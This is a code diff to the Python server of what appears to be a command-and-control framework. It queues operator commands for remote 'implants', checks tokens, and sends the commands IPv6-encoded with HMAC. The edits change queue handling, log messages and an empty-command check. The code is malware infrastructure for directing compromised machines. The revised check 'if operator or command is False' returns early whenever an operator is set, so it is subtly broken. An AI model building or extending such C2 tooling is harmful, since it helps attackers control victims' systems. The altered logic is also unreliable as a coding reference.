@@ -258,7 +258,8 @@ def add_command(implant_id, operator, command):
     else:
         logger.error(f"No queue found for implant {implant_id}, creating one")
         implant_command_queues.setdefault(implant_id, Queue())
-        implant_command_queues[implant_id].put(command.strip())
+        queue = implant_command_queues.get(implant_id)
+        queue.put((operator, command))
         logger.info(f"Added command for implant {implant_id}: {command}")
 
 
@@ -313,10 +314,10 @@ def get_waiting_command(implant_id):
     if queue:
         try:
             operator, command = queue.get()
-            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
+            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={type(command)}")
             return operator, command
         except Empty:
-            logger.info(f"No commands available for {implant_id}")
+            logger.info("empty queue found")
             return False, False
     else:
         logger.info(f"No queue found for {implant_id}")
@@ -404,7 +405,7 @@ def handle_client(client_socket, client_id):
                     command = command[0] if command else ""
                     add_command(implant_id, uname, command)
                     client_socket.send("Command queued :blue".encode())
-                    logger.info(f"Command: {command} added to queue for implant: {implant_id} :blue")
+                    logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                 else:
                     client_socket.send(f"Bad token :red".encode())
                     logger.error("bad token")
@@ -544,9 +545,9 @@ def register_routes():
             get_imp_id = parsed_data.get('id')
 
             operator, command = get_waiting_command(get_imp_id[0])
-            if operator and command is False:
-                logger.error("operator and command in queue returned as false")
-                return "error"
+            if operator or command is False:
+                logger.error("operator or command in queue returned as false")
+                return " "
             checkout_command(get_imp_id[0], operator, command)
             command = json.dumps(ipv6_encoder.string_to_ipv6(command))
             logger.info("sending command and HMAC to implant")
